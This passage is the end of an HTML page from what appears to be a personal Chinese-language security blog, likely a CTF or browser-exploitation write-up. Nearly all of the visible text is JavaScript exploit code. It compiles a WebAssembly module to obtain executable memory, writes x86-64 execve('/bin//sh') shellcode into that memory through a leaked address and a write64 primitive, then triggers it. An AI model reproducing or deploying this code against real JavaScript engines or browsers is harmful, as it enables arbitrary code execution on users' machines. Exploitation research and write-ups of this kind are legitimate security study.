	  <span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">1</span>,<span class="hljs-number">126</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">112</span>,<span class="hljs-number">119</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">81</span>,<span class="hljs-number">1</span>,<span class="hljs-number">79</span>,<span class="hljs-number">0</span>,<span class="hljs-number">66</span>,<span class="hljs-number">200</span>,<span class="hljs-number">146</span>,<span class="hljs-number">158</span>,<span class="hljs-number">142</span>,<span class="hljs-number">163</span>,<span class="hljs-number">154</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">132</span>,<span class="hljs-number">196</span>,<span class="hljs-number">177</span>,<span class="hljs-number">143</span>,<span class="hljs-number">139</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">143</span>,<span class="hljs-number">138</span>,<span class="hljs-number">160</span>,<span class="hljs-number">202</span>,<span class="hljs-number">232</span>,<span class="hljs-number">152</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">200</span>,<span class="hljs-number">197</span>,<span class="hljs-number">145</span>,<span class="hljs-number">157</span>,<span class="hljs-number">200</span>,<span class="hljs-number">214</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">130</span>,<span class="hljs-number">252</span>,<span class="hljs-number">130</span>,<span class="hljs-number">137</span>,<span class="hljs-number">146</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">208</span>,<span class="hljs-number">192</span>,<span class="hljs-number">132</span>,<span class="hljs-number">137</span>,<span class="hljs-number">146</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">216</span>,<span class="hljs-number">158</span>,<span class="hljs-number">148</span>,<span class="hljs-number">128</span>,<span class="hljs-number">137</span>,<span class="hljs-number">146</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">110</span>,<span class="hljs-number">97</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">112</span>,<span class="hljs-number">119</span>,<span class="hljs-number">110</span>
	]);
	<span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasm_bytes);
	<span class="hljs-keyword">const</span> instance_shellcode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(mod);
	<span class="hljs-keyword">const</span> pwn = instance_shellcode.<span class="hljs-property">exports</span>.<span class="hljs-property">pwn</span>;

	<span class="hljs-keyword">var</span> shellcode = [
		<span class="hljs-number">0x6E69622FB848686An</span>,
		<span class="hljs-number">0xE7894850732F2F2Fn</span>,
		<span class="hljs-number">0x2434810101697268n</span>,
		<span class="hljs-number">0x6A56F63101010101n</span>,
		<span class="hljs-number">0x894856E601485E08n</span>,
		<span class="hljs-number">0x050F583B6AD231E6n</span>,
		<span class="hljs-number">0xFFFFFEC0E9909090n</span>
	];

	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0n</span>; i &lt; <span class="hljs-number">7n</span>; ++i) {
		<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(shellcode[i]);
		<span class="hljs-title function_">write64</span>(rwx_leak + i * <span class="hljs-number">8n</span>, shellcode[i]);
	}
	<span class="hljs-title class_">RandomLeak</span>();
})();
</code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>